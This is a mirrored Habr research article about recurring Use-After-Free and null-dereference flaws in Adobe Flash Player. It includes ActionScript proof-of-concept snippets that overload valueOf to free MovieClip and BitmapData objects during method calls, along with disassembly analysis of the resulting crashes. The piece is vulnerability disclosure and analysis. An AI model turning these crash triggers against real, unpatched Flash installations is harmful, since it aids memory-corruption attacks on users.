<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Sieve called Adobe Flash</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The still widely used Flash Player from Adobe is notorious for its security. Regularly becoming aware of another zero-day vulnerability in Flash, used...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Sieve called Adobe Flash</h1><div class="post__text post__text-html js-mediator-article"><img align="left" src="https://habrastorage.org/files/f37/c2c/2ab/f37c2c2aba18403fb4e7b33cf6ce6729.png">  The still widely used Flash Player from Adobe is notorious for its security.  Regularly becoming aware of another zero-day vulnerability in Flash, used by hackers in the APT campaigns.  The year 2015 was particularly fruitful for such vulnerabilities.  A large proportion of critical RCE vulnerabilities were caused by incorrect memory handling: it was possible to write to the freed memory on the Flash process heap. <br><br>  In this article, we investigated the security of Adobe Flash and found out that many of its ‚Äúsecurity holes‚Äù are chronic, and they can only be solved by rewriting the code from scratch, while the developers put a patch on the patch, which, of course, does not improve security.  And we will demonstrate some of the vulnerabilities we have found and that are not currently closed! <br><a name="habracut"></a><br><h4>  <b>Sensational Vulnerabilities</b> </h4><br>  In February-March 2015, similar Use-After-Free vulnerabilities CVE-2015-0313 and CVE-2015-0311 were discovered in the ActionScript class ByteArray (you can read about them <a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/A-New-Zero-Day-of-Adobe-Flash-CVE-2015-0313-Exploited-in-the-Wild/">here</a> and <a href="http://blog.trendmicro.com/trendlabs-security-intelligence/analyzing-cve-2015-0313-the-new-flash-player-zero-day/">here</a> ).  An object of type ByteArray, marked as domainMemory for performing fast and low-level read-write operations in memory, did not notify domainMMory storing a pointer to it when the pointer to its buffer was changed. <br><br>  In CVE-2015-0313, the object was deleted in another thread; in CVE-2015-0311, it was unsuccessfully unpacked using zlib.  This made it possible to write to the freed memory of other objects and modify them, breaking class invariants. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      In July 2015, public exploits to the zero-day vulnerabilities <a href="https://habrahabr.ru/company/eset/blog/262061/">CVE-2015-5119</a> , <a href="https://www.fireeye.com/blog/threat-research/2015/07/cve-2015-5122_-_seco.html">CVE-2015-5122</a> , leaked from the hacked archives of the Italian company Hacking Team, made a lot of noise.  ActionScript assignment statements to a cell of a ByteArray object by index (in CVE-2015-5119) and the opaqueBackground field setting operator in the TextLine class (in CVE-2015-5122) were vulnerable. <br><br>  The expected value for such assignments is numeric.  If you pass a custom class object with the overloaded valueOf method as the assignment value to the ByteArray element / opaqueBackground field, an implicit coercion of this object to a numeric type will occur, with the overloaded valueOf being called.  If in the valueOf method, prior to the above assignment, to free the resources of the ByteArray object / TextLine object, the memory becomes available, but a pointer to it is saved, and it will be written to the freed memory on the heap. <br><br>  In general, the Use-After-Free vulnerabilities in Flash are still a headache for Adobe, since they appear quite often. <br><br><h4>  <b>Vulnerabilities in TextField and MovieClip from Google Project Zero</b> </h4><br>  Such vulnerabilities sometimes contain entire groups of ActionScript class methods.  For example, the set of vulnerabilities in the ActionScript 2 methods of MovieClip and TextField detected by the Google Project Zero team allowed the object to free up memory before attempting to use it.  Some vulnerable methods are: <br><br>  1. <a href="https://code.google.com/p/google-security-research/issues/detail%3Fid%3D591%26can%3D1%26start%3D500">CVE-2015-8412</a> : The mc object is freed before use with an implicit call of valueOf in the duplicateMovieClip method: <br><br><pre><code class="hljs actionscript"><span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.createEmptyMovieClip(<span class="hljs-string"><span class="hljs-string">"mc"</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>); mc.duplicateMovieClip( <span class="hljs-string"><span class="hljs-string">"mc"</span></span>,{valueOf : func}); <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">func</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ trace(<span class="hljs-string"><span class="hljs-string">"in func"</span></span>); mc.removeMovieClip(); <span class="hljs-comment"><span class="hljs-comment">// Fix heap here return 5; }</span></span></code> </pre> <br><br>  2. <a href="https://code.google.com/p/google-security-research/issues/detail%3Fid%3D558%26can%3D1%26start%3D400">CVE-2015-8044</a> : The triangle_mc object is freed before use when implicitly calling valueOf in the lineStyle method: <br><br><pre> <code class="hljs swift">this.createEmptyMovieClip(<span class="hljs-string"><span class="hljs-string">"triangle_mc"</span></span>, this.getNextHighestDepth()); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = {<span class="hljs-built_in"><span class="hljs-built_in">toString</span></span>: <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">func</span></span></span><span class="hljs-function">}; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">triangle_mc</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">lineStyle</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">5</span></span></span></span><span class="hljs-function"><span class="hljs-params">, </span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">0xff00ff</span></span></span></span><span class="hljs-function"><span class="hljs-params">, </span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">100</span></span></span></span><span class="hljs-function"><span class="hljs-params">, </span></span><span class="hljs-literal"><span class="hljs-function"><span class="hljs-params"><span class="hljs-literal">true</span></span></span></span><span class="hljs-function"><span class="hljs-params">, o, </span></span><span class="hljs-string"><span class="hljs-function"><span class="hljs-params"><span class="hljs-string">"round"</span></span></span></span><span class="hljs-function"><span class="hljs-params">, </span></span><span class="hljs-string"><span class="hljs-function"><span class="hljs-params"><span class="hljs-string">"miter"</span></span></span></span><span class="hljs-function"><span class="hljs-params">, </span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">1</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span></span>; function <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">func</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ triangle_mc.removeMovieClip(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"none"</span></span>; }</code> </pre><br><br>  The situation is similar with TextField class ActionScript 2 methods (CVE-2015-7652, CVE-2015-8046, CVE-2015-8423, CVE-2015-8424, CVE-2015-8425, CVE-2015-8427, CVE-2015- 8428, CVE-2015-8429, CVE-2015-8430, etc.) <br><br>  Seeing such a mess, we decided to find out if things are really so bad with the security of Flash?  And ... yes, everything is bad! <br><br><h4>  <b>Vulnerabilities in the class BitmapData</b> </h4><br>  We decided to look at the situation in other ActionScript Flash classes.  It turned out that a set of similar Use-After-Free vulnerabilities was also present in the ActionScript 2 class BitmapData.  At the time of the study of this class, the latest version of Flash was version 18.0.0.209.  Part of the vulnerabilities (regardless of us) was later identified by other researchers, some remained unclosed until the release of version 20.0.0.228. <br><br>  To free up memory before using the BitmapData object, the same trick was used with overloading the valueOf method of the custom class.  This method is implicitly called when it is necessary to convert a class object to the Number type.  This happens, for example, during the preliminary calculation of the arguments of functions or methods. <br><br><pre> <code class="hljs actionscript"><span class="hljs-meta"><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">import</span></span></span><span class="hljs-meta"> flash.geom.Point;</span></span> <span class="hljs-meta"><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">import</span></span></span><span class="hljs-meta"> flash.geom.Rectangle;</span></span> <span class="hljs-meta"><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">import</span></span></span><span class="hljs-meta"> flash.display.BitmapData;</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MyClass</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> bitmap1:BitmapData, bitmap2:BitmapData, bitmap3:BitmapData; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">MyClass</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ } <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">vof</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ trace(<span class="hljs-string"><span class="hljs-string">"in valueOf.."</span></span>); bitmap2.dispose(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">expl</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ trace(<span class="hljs-string"><span class="hljs-string">"in expl"</span></span>); MyClass.prototype.valueOf = MyClass.vof; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> array:Array = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Array(<span class="hljs-number"><span class="hljs-number">256</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i:Number= <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">256</span></span>; i++) { array[i] = <span class="hljs-number"><span class="hljs-number">0xaaddddaa</span></span>; } array[<span class="hljs-number"><span class="hljs-number">0xFF</span></span>] = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> MyClass(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> MyClass(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> rect:Rectangle = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Rectangle(<span class="hljs-number"><span class="hljs-number">10</span></span>, <span class="hljs-number"><span class="hljs-number">11</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> pt:Point = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Point(<span class="hljs-number"><span class="hljs-number">12</span></span>, <span class="hljs-number"><span class="hljs-number">12</span></span>); bitmap1 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BitmapData(<span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-number"><span class="hljs-number">0xaabbccdd</span></span>); bitmap2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BitmapData(<span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-number"><span class="hljs-number">0xaabbccdd</span></span>); bitmap3 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BitmapData(<span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-number"><span class="hljs-number">0xaabbccdd</span></span>);</code> </pre><br><br>  Now we call the vulnerable method of the BitmapData class: <br><br><pre> <code class="hljs pgsql">Bitmap2.hitTest(pt, <span class="hljs-number"><span class="hljs-number">1</span></span>, bitmap1, <span class="hljs-built_in"><span class="hljs-built_in">new</span></span> <span class="hljs-type"><span class="hljs-type">Point</span></span>(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>), o);</code> </pre><br><br>  In this case, the vulnerable method BitmapData.hitTest is called with a parameter of the type MyClass (_loc3_ [255]), which is implicitly reduced to integer form by calling the vof function.  Inside the function, the memory of the myBitmapData2 object is freed before using the pointer to it.  In the heap, where the BitmapData data structure is stored, the pointer to the pixel buffer (also in the heap) is reset. <br><br>  Not only the BitmapData.hitTest method is vulnerable.  Here is a list of vulnerable methods found by us in Adobe Flash version 18.0.0.209, along with the vulnerable part of the code. <br><br>  <i><b>BitmapData.draw</b></i> <br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">bitmap2</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.draw</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">bitmap1</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">Matrix</span></span>(0<span class="hljs-selector-class"><span class="hljs-selector-class">.5</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">array</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[0xFF]</span></span>, 0<span class="hljs-selector-class"><span class="hljs-selector-class">.5</span></span>, 0<span class="hljs-selector-class"><span class="hljs-selector-class">.5</span></span>));</code> </pre><br><br>  <i><b>BitmapData.copyChannel</b></i> <br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">bitmap2</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.copyChannel</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">bitmap1</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">rect</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">pt</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o</span></span>, 4); <span class="hljs-selector-tag"><span class="hljs-selector-tag">bitmap1</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.copyChannel</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">bitmap2</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">rect</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">pt</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o</span></span>, 4);</code> </pre><br><br>  <i><b>BitmapData.copyPixels</b></i> <br><pre> <code class="hljs pgsql">bitmap2.copyPixels(bitmap1, <span class="hljs-built_in"><span class="hljs-built_in">new</span></span> Rectangle(<span class="hljs-number"><span class="hljs-number">10</span></span>, <span class="hljs-number"><span class="hljs-number">11</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>[<span class="hljs-number"><span class="hljs-number">0xFF</span></span>]), pt, bitmap3); bitmap1.copyPixels(bitmap2, <span class="hljs-built_in"><span class="hljs-built_in">new</span></span> Rectangle(<span class="hljs-number"><span class="hljs-number">10</span></span>, <span class="hljs-number"><span class="hljs-number">11</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>[<span class="hljs-number"><span class="hljs-number">0xFF</span></span>]), pt, bitmap3);</code> </pre><br><br>  <i><b>BitmapData.paletteMap</b></i> <br><pre> <code class="hljs pgsql">bitmap2.paletteMap(bitmap1, rect, pt, <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>); bitmap1.paletteMap(bitmap2, rect, pt, <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>);</code> </pre><br><br>  <i><b>BitmapData.floodFill</b></i> <br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">bitmap2</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.floodFill</span></span>(10, 10, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o</span></span>);</code> </pre><br><br>  <i><b>BitmapData.pixelDissolve</b></i> <br><pre> <code class="hljs pgsql">bitmap2.pixelDissolve(bitmap1, <span class="hljs-built_in"><span class="hljs-built_in">new</span></span> Rectangle(<span class="hljs-number"><span class="hljs-number">10</span></span>, <span class="hljs-number"><span class="hljs-number">11</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>), <span class="hljs-built_in"><span class="hljs-built_in">new</span></span> <span class="hljs-type"><span class="hljs-type">Point</span></span>(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>), <span class="hljs-number"><span class="hljs-number">1245</span></span>, o); bitmap1.pixelDissolve(bitmap2, <span class="hljs-built_in"><span class="hljs-built_in">new</span></span> Rectangle(<span class="hljs-number"><span class="hljs-number">10</span></span>, <span class="hljs-number"><span class="hljs-number">11</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>), <span class="hljs-built_in"><span class="hljs-built_in">new</span></span> <span class="hljs-type"><span class="hljs-type">Point</span></span>(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>), <span class="hljs-number"><span class="hljs-number">1245</span></span>, o);</code> </pre><br><br>  <i><b>BitmapData.merge</b></i> <br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">bitmap2</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.merge</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">bitmap1</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">rect</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">pt</span></span>, 1, 1, 1, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o</span></span>); <span class="hljs-selector-tag"><span class="hljs-selector-tag">bitmap1</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.merge</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">bitmap2</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">rect</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">pt</span></span>, 1, 1, 1, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o</span></span>);</code> </pre><br><br>  <i><b>BitmapData.getColorBounds</b></i> <br><pre> <code class="hljs go"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> z:Rectangle = bitmap2.getColorBoundsRect(array[<span class="hljs-number"><span class="hljs-number">0xFF</span></span>], <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span>);</code> </pre><br><br>  <i><b>BitmapData.scroll</b></i> <br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">bitmap2</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.scroll</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">o</span></span>, 13);</code> </pre><br><br>  Each of these methods causes memory dereferencing near zero when reading and, accordingly, the collapse of Adobe Flash version 18.0.0.209.  Some of the methods cause the collapse of all versions up to and including 19.0.0.245, which should fix them all! <br><br>  The fact that whole ActionScript classes have security problems is already alarming.  But that is not all.  It turns out that there are vulnerabilities in the Adobe world, which are then closed, then re-opened in the latest version! <br><br><h4>  <b>Bug or feature?</b> </h4><br>  One of the above vulnerabilities, in the BitmapData.merge method, was closed in version 18.0.0.232.  It remained closed until version 19.0.0.245, however, starting with the release of 20.0.0.228, it was unclosed again!  The following code causes memory dereferencing near zero and Flash to fall in the specified versions: <br><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">bitmap2</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.merge</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">bitmap1</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">rect</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">pt</span></span>, 1, 1, 1, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o</span></span>);</code> </pre><br><br><img src="https://habrastorage.org/files/d9a/03b/0c1/d9a03b0c18934d0db440a35ec4886122.png"><br><br><img src="https://habrastorage.org/files/324/8d2/d65/3248d2d65fa1491d8af609e96359e91d.png"><br><br>  If now the source object is removed in the valueOf method, not the receiver object, then such a swf file will cause a crash of all Flash versions in general, including the latest for today (21.0.0.182): <br><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">bitmap1</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.merge</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">bitmap2</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">rect</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">pt</span></span>, 1, 1, 1, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o</span></span>);</code> </pre><br><br>  Let's see what happens in the Flash code before it crashes.  For this we use the disassembler IDA Pro and x86-decompiler Hex-Rays.  The sub_12FDF50 function is called several times when calculating the parameters of the BitmapData.merge function, and in the latest Flash version, the BitmapData object is pre-deleted and the memory cell is reset to the address [esi + 0xC8] in the sub_122DD40 function (.text tag: 0122DD82 in the disassembled code, line 19) decompiled code): <br><br><img src="https://habrastorage.org/files/1be/5a6/356/1be5a63568204c33bb6cd665aae2d0df.png"><br><br>  After calculating the parameters, the procedure sub_1230D10 is called: <br><br><img src="https://habrastorage.org/files/87d/d32/daf/87dd32daf0144ca2a429cb212fd44aae.png"><br><br><img src="https://habrastorage.org/files/7ff/bdb/382/7ffbdb382a2841389255638fd81f67ff.png"><br><br>  Please note that the ecx register at the time of calling sub_1230D10 contains the same address, the value of which was previously reset when calculating the parameters of the BitmapData.merge function and zeroing the bitmap2 receiver object in the valueOf method. <br><br>  In the sub_1230D10 function, memory is dereferenced next to the address in the cell [ecx + 0xC8].  As you can see, this is the address, the value of which was previously reset to zero when the BitmapData receiver object was deleted.  The result is a Flash crash: <br><br><img src="https://habrastorage.org/files/edc/6a7/225/edc6a7225df64b019b13c858f07b6947.png"><br><br>  It is unclear what makes Adobe reopen previously patched vulnerabilities. <br><br><h4>  <b>CVE-2015-?</b> </h4><br>  Finally, we give another vulnerability we found.  It is not related to the use of memory after release, but is a very clear example of vulnerable code. <br><br>  The vulnerability was found in debug versions of Flash for Windows (including browser plugins) in conjunction with the Adobe Flex Debugger (FDB).  It consists in an incorrect search for the value of the linked list in the Flash code and works in the debug version of Flash when the FDB debugger is running. <br><br>  The swf file main.swf generated by us in ActionScript 3 code loads another swf file inside itself, expressInstall_.swf in ActionScript 2 code that refers to the external address: <br><br><img src="https://habrastorage.org/files/cec/0cb/713/cec0cb71316142baa7bbf8ccb6fdeb00.jpg"><br><br><img src="https://habrastorage.org/files/93b/5af/c4a/93b5afc4a8034ac4ad32bdcce2e4dba9.jpg"><br><br>  For the analysis again we will use IDA Pro and Hex-Rays.  When the Flex Debugger is active (for example, while debugging ActionScript code), Flash, when running the swf generated by us, generates an error message: <br><br><img src="https://habrastorage.org/files/9ba/453/2ce/9ba4532cee6a425ca632ceb182eb8c00.jpg"><br><br>  In the sub_C57769 function, a string is calculated, which will be output by the sub_B8E6D9 function in the error message after the word ‚ÄúBase‚Äù. <br><br><img src="https://habrastorage.org/files/5ae/9b0/112/5ae9b01122324c6ea4f04d747dcfaf2b.jpg"><br><br>  To calculate in a loop on the linked list v4, we look for a cell with certain properties (* (* (v4 + 24) + 252) == 98).  The cycle is terminated in three cases: <br><ul><li>  if the desired cell is encountered (* (v6 + 252) == 98 </li><li>  if we did not find the desired cell in the list in 256 steps (v5&gt; = 256) </li><li>  if the list is over (v4 == 0) </li></ul><br>  After exiting the loop, the final cell is used in further calculations.  There is an error on the generated swf file: there are no cells with the necessary property in the list, and the cycle ends at the end of the list.  Adobe Flash crashes after exiting the loop with v4 == 0: <br><br><img src="https://habrastorage.org/files/edf/b22/b69/edfb22b69b26467384dc80e15f41b6e6.jpg"><br><br>  As you can see, the exit code from the loop is vulnerable.  Potentially, the formation of such a condition in which the v4 will be controlled by the attacker address.  This is possible if the list is longer than 256 values, and the first 256 will not satisfy the property (* (* (v4 + 24) + 252) == 98).  Then the while loop finishes by the condition (v5&gt; = 256), and in v4, the address of the next cell is found. <br><br><h4>  <b>What else can you say?</b> </h4><br>  Just recently, Adobe released another patch covering 23 vulnerabilities in Flash, including critical ones.  Reportedly, one of them is already being used in narrowly targeted attacks. <br><br>  You can definitely say that Flash technology, due to chronic security problems, will sooner or later be finally pushed out of browsers, and maybe even from desktops, whatever Adobe says about it.  Youtube has been successfully working on HTML5 for a long time. In Mozilla, Flash has already been removed from the standard Firefox distribution.  Now it is the turn of other players on the market - it is not beneficial for anyone to lower the safety of their product in comparison with competitors.  So, Flash, come on, bye! </div><p>Source: <a href="https://habr.com/ru/post/279051/">https://habr.com/ru/post/279051/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../279041/index.html">Updated online courses Mail.Ru Group and interviews with their creators</a></li>
<li><a href="../279043/index.html">How to make friends JMS Serializer and LiipImagineBundle</a></li>
<li><a href="../279045/index.html">I am writing a TreeView on Angular 2</a></li>
<li><a href="../279047/index.html">Badoo switched to PHP7 and saved $ 1M</a></li>
<li><a href="../279049/index.html">Checking the status of antivirus in the corporate network using VBScript</a></li>
<li><a href="../279053/index.html">PUE celebrates its 10th anniversary. What a sad gift has the IT community prepared for him?</a></li>
<li><a href="../279055/index.html">West Game Development Forum: Create, Share, Improve</a></li>
<li><a href="../279059/index.html">Svezhak for iOS developers - Digest MBLTdev</a></li>
<li><a href="../279061/index.html">Icy Rocks Test for Android: it's time for a real test</a></li>
<li><a href="../279063/index.html">Automatically update Firefox extensions</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
